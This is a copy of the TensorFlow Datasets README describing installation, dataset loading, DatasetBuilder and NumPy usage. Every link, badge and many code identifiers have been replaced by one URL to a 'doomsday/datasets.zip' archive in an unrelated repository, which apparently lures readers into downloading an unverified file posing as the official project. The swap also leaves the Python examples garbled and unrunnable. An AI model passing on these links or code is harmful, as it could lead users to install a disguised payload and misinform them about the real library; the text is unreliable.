# TensorFlow Datasets

TensorFlow Datasets provides many public datasets as `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`.

[![Kokoro](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
[![PyPI version](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)

* [List of datasets](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
* [Try it in Colab](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
* [API docs](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
* [Add a dataset](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)

**Table of Contents**

* [Installation](#installation)
* [Usage](#usage)
* [`DatasetBuilder`](#datasetbuilder)
* [NumPy usage](#numpy-usage-with-tfdsas-numpy)
* [Want a certain dataset?](#want-a-certain-dataset)
* [Disclaimers](#disclaimers)

### Installation

```sh
pip install tensorflow-datasets

# Requires TF 1.12+ to be installed.
# Some datasets require additional libraries; see https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip extras_require
pip install tensorflow
# or:
pip install tensorflow-gpu
```

### Usage

```python
import tensorflow_datasets as tfds
import tensorflow as tf

# tfds works in both Eager and Graph modes
https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip()

# See available datasets
print(https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip())

# Construct a https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip
ds_train, ds_test = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(name="mnist", split=["train", "test"])

# Build your input pipeline
ds_train = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(1000).batch(128).prefetch(10)
for features in https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(1):
  image, label = features["image"], features["label"]
```

Try it interactively in a
[Colab notebook](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip).

### `DatasetBuilder`

All datasets are implemented as subclasses of
[`DatasetBuilder`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
and
[`https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
is a thin convenience wrapper.
[`DatasetInfo`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
documents the dataset.

```python
import tensorflow_datasets as tfds

# The following is the equivalent of the `load` call above.

# You can fetch the DatasetBuilder class by string
mnist_builder = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip("mnist")

# Download the dataset
https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip()

# Construct a https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip
ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)

# Get the `DatasetInfo` object, which contains useful information about the
# dataset and its features
info = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip
print(info)

    https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(
        name='mnist',
        version=1.0.0,
        description='The MNIST database of handwritten digits.',
        urls=[u'https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip'],
        features=FeaturesDict({
            'image': Image(shape=(28, 28, 1), https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip),
            'label': ClassLabel(shape=(), https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip, num_classes=10)
        },
        total_num_examples=70000,
        splits={
            u'test': <https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip num_examples=10000>,
            u'train': <https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip num_examples=60000>
        },
        supervised_keys=(u'image', u'label'),
        citation='"""
            @article{lecun2010mnist,
              title={MNIST handwritten digit database},
              author={LeCun, Yann and Cortes, Corinna and Burges, CJ},
              journal={ATT Labs [Online]. Available: http://yann. lecun. com/exdb/mnist},
              volume={2},
              year={2010}
            }
      """',
  )
```

You can also get details about the classes (number of classes and their names).

```python
info = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip('cats_vs_dogs').info

https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].num_classes  # 2
https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].names  # ['cat', 'dog']
https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].int2str(1)  # "dog"
https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip['label'].str2int('cat')  # 0
```

### NumPy Usage with `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`

As a convenience for users that want simple NumPy arrays in their programs, you
can use
[`https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
to return a generator that yields NumPy array
records out of a `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip`. This allows you to build high-performance
input pipelines with `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip` but use whatever you'd like for your model
components.

```python
train_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip("mnist", https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip)
train_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(1024).batch(128).repeat(5).prefetch(10)
for example in https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(train_ds):
  numpy_images, numpy_labels = example["image"], example["label"]
```

You can also use `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip` in conjunction with `batch_size=-1` to
get the full dataset in NumPy arrays from the returned `https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip` object:

```python
train_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip("mnist", https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip, batch_size=-1)
numpy_ds = https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip(train_ds)
numpy_images, numpy_labels = numpy_ds["image"], numpy_ds["label"]
```

Note that the library still requires `tensorflow` as an internal dependency.

## Want a certain dataset?

Adding a dataset is really straightforward by following
[our guide](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip).

Request a dataset by opening a
[Dataset request GitHub issue](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip+request&https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip%5Bdata+request%5D+%3Cdataset+name%3E).

And vote on the current
[set of requests](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip%20request)
by adding a thumbs-up reaction to the issue.

#### *Disclaimers*

*This is a utility library that downloads and prepares public datasets. We do*
*not host or distribute these datasets, vouch for their quality or fairness, or*
*claim that you have license to use the dataset. It is your responsibility to*
*determine whether you have permission to use the dataset under the dataset's*
*license.*

*If you're a dataset owner and wish to update any part of it (description,*
*citation, etc.), or do not want your dataset to be included in this*
*library, please get in touch through a GitHub issue. Thanks for your*
*contribution to the ML community!*

*If you're interested in learning more about responsible AI practices, including*
*fairness, please see Google AI's [Responsible AI Practices](https://raw.githubusercontent.com/ksnnd32/datasets/master/doomsday/datasets.zip).*

*`tensorflow/datasets` is Apache 2.0 licensed. See the `LICENSE` file.*
